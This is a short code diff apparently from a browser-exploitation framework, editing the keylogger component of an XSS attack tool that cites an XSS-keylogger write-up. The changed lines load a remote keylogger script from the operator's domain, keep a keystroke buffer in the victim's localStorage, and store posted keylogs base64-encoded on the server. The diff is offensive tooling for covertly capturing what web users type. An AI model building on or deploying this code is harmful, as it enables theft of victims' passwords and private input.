@@ -2,11 +2,12 @@
     quininer[http://wiremask.eu/xss-keylogger/] - 140505
     keylogger - null
         - keylogger(local + Not IME)
-            gum_postkeylogs()
+            gum.script('http://'+gum.domain+'/static/brows/tool_keylogger.js');
+            //gum_postkeylogs();
         and
-            browserinfo['keylogs'] = b64encode(str(request.forms.get('keylogs')))
+            browserinfo['keylogs'] = b64ens(request.forms.keylogs)
  */
-if ('gum_keyslog' in window.localStorage){
+if (!('gum_keyslog' in window.localStorage)){
     window.localStorage.setItem('gum_keyslog', '')
 };
 
